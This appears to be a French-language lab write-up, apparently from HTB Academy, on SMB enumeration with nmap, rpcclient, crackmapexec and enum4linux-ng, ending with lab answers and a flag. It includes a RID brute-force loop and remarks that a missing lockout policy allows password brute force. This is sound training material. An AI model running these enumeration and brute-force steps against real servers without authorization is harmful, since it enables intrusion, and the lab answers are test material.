> En tant que pentester, je dois être conscient que mes connexions sont loggées. En environnement réel, l'admin peut me détecter via smbstatus.
{: .prompt-warning}

#### Sécurité au niveau du domaine

**Ce que j'ai appris :** Dans un environnement de domaine Windows :
- Le serveur Samba agit comme **membre du domaine**
- L'authentification est gérée par un **contrôleur de domaine** (Windows NT Server)
- Les mots de passe sont stockés dans **NTDS.dit** et **SAM**
- Authentification unique au premier login, puis accès aux autres partages sans re-login

### Énumération avec Nmap

#### Scan SMB basique

**Ma commande :**
```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

**Résultat obtenu :**
```
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

**Mon observation :** Nmap donne peu d'informations comparé aux outils spécialisés. Il confirme :
- Version Samba : 4.6.2
- Message signing : activé mais non requis (vulnérable à relay attacks)
- NetBIOS name : HTB

> Nmap est utile pour la découverte initiale, mais les outils spécifiques SMB donnent beaucoup plus de détails
{: .prompt-info}

### Énumération avec rpcclient

#### Qu'est-ce que RPC ?

**RPC (Remote Procedure Call)** permet d'exécuter des fonctions sur un serveur distant. C'est un concept fondamental dans les architectures client-serveur.

> **Pour les débutants :** RPC permet à votre machine d'appeler des fonctions sur un serveur comme si elles étaient locales.
{: .prompt-info}

#### Connexion anonyme avec rpcclient

**Ma commande :**
```bash
rpcclient -U "" 10.129.14.128
```

**Session obtenue :**
```
Enter WORKGROUP\'s password:
rpcclient $>
```

**Encore une fois :** Appuyer sur Entrée sans mot de passe = accès réussi !

#### Commandes rpcclient essentielles

**Commandes que j'utilise systématiquement :**

| Commande | Description | Usage |
|----------|-------------|-------|
| `srvinfo` | Informations serveur | Version, type, plateforme |
| `enumdomains` | Énumération des domaines | Identifier les domaines déployés |
| `querydominfo` | Détails du domaine | Utilisateurs, groupes, serveur |
| `netshareenumall` | Liste tous les partages | Découvrir les shares accessibles |
| `netsharegetinfo <share>` | Détails d'un partage | Permissions, ACL, chemin |
| `enumdomusers` | Liste les utilisateurs | Noms d'utilisateurs du domaine |
| `queryuser <RID>` | Détails d'un utilisateur | Infos complètes sur un user |

#### Extraction d'informations serveur

**Commande testée :**
```bash
rpcclient $> srvinfo

DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
platform_id     :       500
os version      :       6.1
server type     :       0x809a03
```

**Mon décodage :**
- **OS version 6.1** = Windows 7 ou Server 2008 R2
- **Unx** = Serveur Unix/Linux (Samba)
- **Platform ID 500** = Workstation

#### Énumération des domaines
```bash
rpcclient $> enumdomains

name:[DEVSMB] idx:[0x0]
name:[Builtin] idx:[0x1]
```

**Mon analyse :** Deux domaines présents, dont "Builtin" qui est standard dans Samba.

#### Informations détaillées du domaine
```bash
rpcclient $> querydominfo

Domain:         DEVOPS
Server:         DEVSMB
Comment:        DEVSM
Total Users:    2
Total Groups:   0
Total Aliases:  0
Sequence No:    1632361158
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
```

**Informations critiques extraites :**
- **Total Users: 2** → Seulement 2 comptes utilisateurs
- **Server Role: ROLE_DOMAIN_PDC** → Contrôleur de domaine principal
- **Domaine: DEVOPS** → Nom du workgroup

#### Énumération complète des partages
```bash
rpcclient $> netshareenumall

netname: print$
        remark: Printer Drivers
        path:   C:\var\lib\samba\printers
netname: home
        remark: INFREIGHT Samba
        path:   C:\home\
netname: dev
        remark: DEVenv
        path:   C:\home\sambauser\dev\
netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
netname: IPC$
        remark: IPC Service (DEVSM)
        path:   C:\tmp
```

**Mon observation :** Les chemins révèlent l'arborescence complète du serveur ! Je sais maintenant que :
- `home` pointe vers `/home/`
- `dev` est dans le home d'un utilisateur "sambauser"
- `notes` est monté sur `/mnt/notes/`

#### Détails d'un partage spécifique
```bash
rpcclient $> netsharegetinfo notes

netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
DACL
        ACL     Num ACEs:       1       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x00 
                Specific bits: 0x1ff
                Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
                SID: S-1-1-0
```

**Mon analyse des ACL :**
- **SID: S-1-1-0** = "Everyone" (tout le monde)
- **Permissions: 0x101f01ff** = Accès complet (lecture, écriture, suppression, modification du propriétaire)
- **max_uses: -1** = Connexions simultanées illimitées

> SID S-1-1-0 signifie que TOUS les utilisateurs ont un accès total au partage. Configuration ultra-dangereuse !
{: .prompt-danger}

### Énumération des utilisateurs

#### Lister les utilisateurs du domaine
```bash
rpcclient $> enumdomusers

user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]
```

**Ce que j'ai trouvé :**
- 2 utilisateurs confirmés
- **RID (Relative Identifier)** : 0x3e8 et 0x3e9
- Noms d'utilisateurs : mrb3n et cry0l1t3

#### Détails complets d'un utilisateur
```bash
rpcclient $> queryuser 0x3e9

        User Name   :   cry0l1t3
        Full Name   :   cry0l1t3
        Home Drive  :   \\devsmb\cry0l1t3
        Dir Drive   :
        Profile Path:   \\devsmb\cry0l1t3\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
        Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST
        Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST
        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
        user_rid :      0x3e9
        group_rid:      0x201
        acb_info :      0x00000014
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
```

**Informations sensibles extraites :**
- **Home Drive** : `\\devsmb\cry0l1t3` → Partage personnel probablement accessible
- **Password last set** : 22 septembre 2021 → Mot de passe possiblement faible ou réutilisé
- **bad_password_count: 0** → Aucun verrouillage de compte après tentatives échouées
- **group_rid: 0x201** → Appartenance à un groupe spécifique

#### Informations sur les groupes
```bash
rpcclient $> querygroup 0x201

        Group Name:     None
        Description:    Ordinary Users
        Num Members:2
```

**Mon analyse :** Les deux utilisateurs appartiennent au groupe "Ordinary Users" avec 2 membres.

### Brute force des RIDs

#### Automatiser la découverte d'utilisateurs

**Ma technique :** Si je n'ai pas accès à `enumdomusers`, je peux brute-forcer les RIDs pour découvrir tous les utilisateurs.

**Script bash que j'utilise :**
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

**Résultat obtenu :**
```
        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
        
        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201
        
        User Name   :   cry0l1t3
        user_rid :      0x3e9
        group_rid:      0x201
```

**Mon observation :** J'ai découvert un **troisième utilisateur** (sambauser) qui n'apparaissait pas avec `enumdomusers` !

> Le brute force de RIDs révèle souvent des comptes cachés ou désactivés
{: .prompt-tip}

#### Alternative avec Impacket - samrdump.py

**Outil Python d'Impacket :**
```bash
samrdump.py 10.129.14.128
```

**Résultat obtenu :**
```
[*] Retrieving endpoint list from 10.129.14.128
Found domain(s):
 . DEVSMB
 . Builtin
[*] Looking up users in domain DEVSMB
Found user: mrb3n, uid = 1000
Found user: cry0l1t3, uid = 1001
mrb3n (1000)/FullName: 
mrb3n (1000)/UserComment: 
mrb3n (1000)/PrimaryGroupId: 513
mrb3n (1000)/BadPasswordCount: 0
mrb3n (1000)/LogonCount: 0
mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59
mrb3n (1000)/PasswordDoesNotExpire: False
mrb3n (1000)/AccountIsDisabled: False
mrb3n (1000)/ScriptPath: 
cry0l1t3 (1001)/FullName: cry0l1t3
cry0l1t3 (1001)/UserComment: 
cry0l1t3 (1001)/PrimaryGroupId: 513
cry0l1t3 (1001)/BadPasswordCount: 0
cry0l1t3 (1001)/LogonCount: 0
cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56
cry0l1t3 (1001)/PasswordDoesNotExpire: False
cry0l1t3 (1001)/AccountIsDisabled: False
```

**Mon analyse :** samrdump.py est plus rapide et formaté, mais donne les mêmes informations que rpcclient.

### Énumération avec SMBMap

#### Vérification rapide des permissions

**Ma commande :**
```bash
smbmap -H 10.129.14.128
```

**Résultat obtenu :**
```
[+] IP: 10.129.14.128:445       Name: 10.129.14.128                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        home                                                    NO ACCESS       INFREIGHT Samba
        dev                                                     NO ACCESS       DEVenv
        notes                                                   NO ACCESS       CheckIT
        IPC$                                                    NO ACCESS       IPC Service (DEVSM)
```

**Ce qui m'a surpris :** SMBMap indique "NO ACCESS" pour tous les partages, alors que smbclient m'a permis d'y accéder anonymement !

> SMBMap peut donner des faux négatifs. Toujours vérifier manuellement avec smbclient ou rpcclient
{: .prompt-warning}

### Énumération avec CrackMapExec

#### Scan complet avec credentials vides

**Ma commande :**
```bash
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```

**Résultat obtenu :**
```
SMB         10.129.14.128   445    DEVSMB           [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)
SMB         10.129.14.128   445    DEVSMB           [+] \: 
SMB         10.129.14.128   445    DEVSMB           [+] Enumerated shares
SMB         10.129.14.128   445    DEVSMB           Share           Permissions     Remark
SMB         10.129.14.128   445    DEVSMB           -----           -----------     ------
SMB         10.129.14.128   445    DEVSMB           print$                          Printer Drivers
SMB         10.129.14.128   445    DEVSMB           home                            INFREIGHT Samba
SMB         10.129.14.128   445    DEVSMB           dev                             DEVenv
SMB         10.129.14.128   445    DEVSMB           notes           READ,WRITE      CheckIT
SMB         10.129.14.128   445    DEVSMB           IPC$                            IPC Service (DEVSM)
```

**Mon analyse :** CrackMapExec est beaucoup plus précis ! Il identifie correctement que :
- **notes** a les permissions **READ,WRITE**
- **SMB signing: False** → Vulnérable aux attaques relay
- **SMBv1: False** → Version ancienne désactivée (bonne pratique)

> CrackMapExec est mon outil préféré pour l'énumération SMB : rapide, précis, et bien formaté
{: .prompt-tip}

### Énumération avec enum4linux-ng

#### Installation d'enum4linux-ng

**Commandes d'installation :**
```bash
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt
```

#### Scan complet automatisé

**Ma commande avec tous les modules :**
```bash
./enum4linux-ng.py 10.129.14.128 -A
```

**Extraits des résultats les plus intéressants :**

#### Service Scan
```
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp
```

**Mon observation :** Pas de LDAP = probablement pas d'Active Directory complet.

#### NetBIOS Information
```
[+] Got domain/workgroup name: DEVOPS
[+] Full NetBIOS names information:
- DEVSMB          <00> -         H <ACTIVE>  Workstation Service
- DEVSMB          <03> -         H <ACTIVE>  Messenger Service
- DEVSMB          <20> -         H <ACTIVE>  File Server Service
- DEVOPS          <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
```

**Pour comprendre les codes NetBIOS :**
- `<00>` = Workstation/Computer name
- `<03>` = Messenger service
- `<20>` = File Server service

#### SMB Dialect Check
```
[+] Supported dialects and settings:
SMB 1.0: false
SMB 2.02: true
SMB 2.1: true
SMB 3.0: true
SMB1 only: false
Preferred dialect: SMB 3.0
SMB signing required: false
```

**Mon analyse stratégique :**
- **SMB 1.0 désactivé** → Bonne pratique, moins vulnérable
- **SMB 3.0 préféré** → Chiffrement disponible mais pas forcé
- **Signing non requis** → Vulnérable aux attaques relay (NTLM relay)

#### RPC Session Check
```
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[+] Server allows session using username 'juzgtcsu', password ''
[H] Rerunning enumeration with user 'juzgtcsu' might give more results
```

**Ce qui m'a surpris :** Le serveur accepte même des noms d'utilisateurs **aléatoires** sans mot de passe !

#### OS Information
```
[+] After merging OS information we have the following result:
OS: Windows 7, Windows Server 2008 R2
OS version: '6.1'
OS release: ''
OS build: '0'
Platform id: '500'
Server type string: Wk Sv PrQ Unx NT SNT DEVSM
```

**Mon décodage :**
- **OS 6.1** = Windows 7 / Server 2008 R2 (ancien, probablement vulnérable)
- **Unx** = Unix/Linux (Samba)

#### Users Enumeration
```
[+] After merging user results we have 2 users total:
'1000':
  username: mrb3n
  name: ''
  acb: '0x00000010'
  description: ''
'1001':
  username: cry0l1t3
  name: cry0l1t3
  acb: '0x00000014'
  description: ''
```

#### Shares Information
```
[+] Found 5 share(s):
notes:
  comment: CheckIT
  type: Disk
[*] Testing share notes
[+] Mapping: OK, Listing: OK
```

**Mon observation :** enum4linux-ng teste automatiquement l'accès à chaque partage !

#### Password Policy
```
[+] Found policy:
domain_password_information:
  min_pw_length: 5
  max_pw_age: 49710 days 6 hours 21 minutes
  pw_properties:
  - DOMAIN_PASSWORD_COMPLEX: false
domain_lockout_information:
  lockout_observation_window: 30 minutes
  lockout_duration: 30 minutes
  lockout_threshold: None
```

**Analyse critique de la politique de mots de passe :**
- **min_pw_length: 5** → Mots de passe très faibles acceptés
- **COMPLEX: false** → Pas d'exigence de complexité
- **lockout_threshold: None** → Aucun verrouillage après tentatives échouées = brute force possible !

> Aucun lockout = je peux brute-forcer les comptes sans risque de les bloquer
{: .prompt-danger}

### Ce que je retiens sur l'énumération SMB

#### Méthodologie complète que j'applique

**Mon workflow systématique :**

1. **Nmap** → Découverte initiale (ports 139, 445)
2. **smbclient -N -L** → Liste des partages accessibles anonymement
3. **rpcclient** → Énumération utilisateurs, groupes, policies
4. **CrackMapExec** → Vérification précise des permissions
5. **enum4linux-ng** → Scan automatisé complet
6. **Brute force RIDs** → Découverte d'utilisateurs cachés
7. **smbclient** → Connexion manuelle aux partages intéressants

#### Erreurs de configuration les plus critiques

**Ce que je cible en priorité :**

1. **Null sessions activées** → Accès anonyme total
2. **guest ok = yes** → Aucune authentification requise
3. **Permissions 0777** → Contrôle total pour tout le monde
4. **SMB signing disabled** → Vulnérable aux relay attacks
5. **Pas de lockout policy** → Brute force sans limitation
6. **Min password length < 8** → Mots de passe faibles

#### Leçons apprises

**Points clés de cette énumération :**

1. **Ne jamais se fier à un seul outil** → SMBMap vs CrackMapExec donnent des résultats différents
2. **L'accès anonyme est très courant** → Toujours tester null sessions
3. **Les partages "test" sont des mines d'or** → Chercher dev, temp, test, backup
4. **rpcclient est puissant** → Permet d'extraire beaucoup plus qu'avec Nmap
5. **Le brute force de RIDs révèle des comptes cachés** → Ne pas s'arrêter à enumdomusers

> Les outils automatisés sont pratiques, mais l'énumération manuelle avec rpcclient et smbclient révèle toujours plus de détails
{: .prompt-tip}

---

**What version of the SMB server is running on the target system? Submit the entire banner as the answer.**

Nous allons vérifier la version de SMB avec un **scan nmap**

```bash
└──╼ [★]$ nmap -sC -sV -A 10.129.115.57
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-20 18:54 CST
Nmap scan report for 10.129.115.57
Host is up (0.058s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 InFreight FTP v1.1
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      44727/tcp   mountd
|   100005  1,2,3      45496/udp6  mountd
|   100005  1,2,3      52367/tcp6  mountd
|   100005  1,2,3      59327/udp   mountd
|   100021  1,3,4      35363/tcp   nlockmgr
|   100021  1,3,4      39957/tcp6  nlockmgr
|   100021  1,3,4      43143/udp6  nlockmgr
|   100021  1,3,4      59950/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2049/tcp open  nfs         3-4 (RPC #100003)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=11/20%Time=691FB86A%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,74,"220\x20InFreight\x20FTP\x20v1\.1\r\n500\x20Invalid\x20
SF:command:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20comma
SF:nd:\x20try\x20being\x20more\x20creative\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/20%OT=21%CT=1%CU=33700%PV=Y%DS=2%DC=T%G=Y%TM=691
OS:FB8B1%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552
OS:ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-11-21T00:55:38
|_  start_date: N/A
|_nbstat: NetBIOS name: DEVSMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   57.45 ms 10.10.14.1
2   58.26 ms 10.129.115.57

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.28 seconds
```

Nous avons tout le scan de nmap sous nos yeux et nous pouvons donc donner précisément la version utilisé de SMB grâce au `-sV` pour trouver les versions

**Réponse :** `Samba smbd 4.6.2`

**What is the name of the accessible share on the target?**

Maintenant en premier nous allons essayer de nous connecter avec `smbclient` en anonyme avec le `-N` pour voir si il y a une restriction

```bash
└──╼ [★]$ smbclient -N -L //10.129.115.57

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      InFreight SMB v3.1
	IPC$            IPC       IPC Service (InlaneFreight SMB server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

**Réponse :** `sambashare`

**Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.**

Nous devons nous connecter et trouver le `flag.txt` et pour cela nous allons utiliser l'outil `smbclient` encore mais pour nous connecter cette fois ci

```bash
└──╼ [★]$ smbclient //10.129.115.57/sambashare
Password for [WORKGROUP\htb-ac-1999270]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Nov  8 07:43:14 2021
  ..                                  D        0  Mon Nov  8 09:53:19 2021
  .profile                            H      807  Tue Feb 25 06:03:22 2020
  contents                            D        0  Mon Nov  8 07:43:45 2021
  .bash_logout                        H      220  Tue Feb 25 06:03:22 2020
  .bashrc                             H     3771  Tue Feb 25 06:03:22 2020

		4062912 blocks of size 1024. 414212 blocks available
smb: \> 
```

J'ai mis `anonymous` comme nom d'utilisateur encore et ça m'a connecté donc parfait maintenant pour nous éviter de chercher longtemps je vais faire un `ls -R` pour lister tout les dossiers dans `/sambashare`

Malheureusement il n'y avait rien dedans donc nous allons essayer de nous connecté avec un compte user avec l'outil `enum4linux`

```bash
└──╼ [★]$ enum4linux 10.129.115.57 -A
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.115.57
[*] Username ......... ''
[*] Random Username .. 'ngyyutpl'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.129.115.57    |
 ======================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.115.57    |
 ============================================================
[+] Got domain/workgroup name: DEVOPS
[+] Full NetBIOS names information:
- DEVSMB          <00> -         H <ACTIVE>  Workstation Service
- DEVSMB          <03> -         H <ACTIVE>  Messenger Service
- DEVSMB          <20> -         H <ACTIVE>  File Server Service
- ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser
- DEVOPS          <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
- DEVOPS          <1d> -         H <ACTIVE>  Master Browser
- DEVOPS          <1e> - <GROUP> H <ACTIVE>  Browser Service Elections
- MAC Address = 00-00-00-00-00-00

 ==========================================
|    SMB Dialect Check on 10.129.115.57    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: false

 ============================================================
|    Domain Information via SMB session for 10.129.115.57    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DEVSMB
NetBIOS domain name: ''
DNS domain: ''
FQDN: nix01
Derived membership: workgroup member
Derived domain: unknown

 ==========================================
|    RPC Session Check on 10.129.115.57    |
 ==========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'ngyyutpl', password ''
[H] Rerunning enumeration with user 'ngyyutpl' might give more results

 ====================================================
|    Domain Information via RPC for 10.129.115.57    |
 ====================================================
[+] Domain: DEVOPS
[+] Domain SID: NULL SID
[+] Membership: workgroup member

 ================================================
|    OS Information via RPC for 10.129.115.57    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Linux/Unix
OS version: '6.1'
OS release: ''
OS build: '0'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x809a03'
Server type string: Wk Sv PrQ Unx NT SNT InlaneFreight SMB server (Samba, Ubuntu)

 ======================================
|    Users via RPC on 10.129.115.57    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 0 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 0 user(s) via 'enumdomusers'

 =======================================
|    Groups via RPC on 10.129.115.57    |
 =======================================
[*] Enumerating local groups
[+] Found 0 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 0 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 0 group(s) via 'enumdomgroups'

 =======================================
|    Shares via RPC on 10.129.115.57    |
 =======================================
[*] Enumerating shares
[+] Found 3 share(s):
IPC$:
  comment: IPC Service (InlaneFreight SMB server (Samba, Ubuntu))
  type: IPC
print$:
  comment: Printer Drivers
  type: Disk
sambashare:
  comment: InFreight SMB v3.1
  type: Disk
[*] Testing share IPC$
[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
[*] Testing share print$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share sambashare
[+] Mapping: OK, Listing: OK

 ==========================================
|    Policies via RPC for 10.129.115.57    |
 ==========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: None
  Minimum password length: 5
  Maximum password age: 49710 days 6 hours 21 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: 49710 days 6 hours 21 minutes

 ==========================================
|    Printers via RPC for 10.129.115.57    |
 ==========================================
[+] No printers returned (this is not an error)

Completed after 15.61 seconds
```

Nous avons beaucoup d'informations très importante ici notamment le fait qu'on peut se connecter même sans avoir de mot de passe et avec n'importe quel nom d'utilisateur 

```bash
└──╼ [★]$ smbclient //10.129.115.57/sambashare
Password for [WORKGROUP\htb-ac-1999270]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Nov  8 07:43:14 2021
  ..                                  D        0  Mon Nov  8 09:53:19 2021
  .profile                            H      807  Tue Feb 25 06:03:22 2020
  contents                            D        0  Mon Nov  8 07:43:45 2021
  .bash_logout                        H      220  Tue Feb 25 06:03:22 2020
  .bashrc                             H     3771  Tue Feb 25 06:03:22 2020

		4062912 blocks of size 1024. 506296 blocks available
smb: \> cd contents
smb: \contents\> ls
  .                                   D        0  Mon Nov  8 07:43:45 2021
  ..                                  D        0  Mon Nov  8 07:43:14 2021
  flag.txt                            N       38  Mon Nov  8 07:43:45 2021

		4062912 blocks of size 1024. 506296 blocks available
smb: \contents\> !strings flag.txt
```

**Réponse :** `HTB{o873nz4xdo873n4zo873zn4fksuhldsf}`

**Find out which domain the server belongs to.**

Nous avons déjà la réponse avec le `enum4linux` précédemment fait et nous pouvons voir ici le domaine :

```bash
 ====================================================
|    Domain Information via RPC for 10.129.115.57    |
 ====================================================
[+] Domain: DEVOPS
[+] Domain SID: NULL SID
[+] Membership: workgroup member
```

**Réponse :** `DEVOPS`

**Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer.**

De même que avec notre outil très puissant `enum4linux` regardez bien cette section:

```bash
 =======================================
|    Shares via RPC on 10.129.115.57    |
 =======================================
[*] Enumerating shares
[+] Found 3 share(s):
IPC$:
  comment: IPC Service (InlaneFreight SMB server (Samba, Ubuntu))
  type: IPC
print$:
  comment: Printer Drivers
  type: Disk
sambashare:
  comment: InFreight SMB v3.1
  type: Disk
[*] Testing share IPC$
[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
[*] Testing share print$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share sambashare
[+] Mapping: OK, Listing: OK
```

Nous pouvons donc y voir la version custom de SMB qui est :

**Réponse :** `InFreight SMB v3.1`

**What is the full system path of that specific share? (format: "/directory/names")**

J'ai fait cette commande qui me permet d'avoir le path complet du dossier

```bash
└──╼ [★]$ rpcclient -U "" -N 10.129.115.57 -c "netshareenumall" | grep -A 5 sambashare
netname: sambashare
	remark:	InFreight SMB v3.1
	path:	C:\home\sambauser\
	password:	
netname: IPC$
	remark:	IPC Service (InlaneFreight SMB server (Samba, Ubuntu))
```

Mais attention parce que sur linux il n'y a pas de `C:\` et pas de \ non plus en général donc on remplace le tout par des / et voici ce que ça donne :

**Réponse :** `/home/sambauser`

---

## NFS (Network File System)

### Comprendre le protocole NFS

**NFS (Network File System)** est un protocole de partage de fichiers développé par Sun Microsystems, équivalent à SMB mais pour les systèmes Linux/Unix.

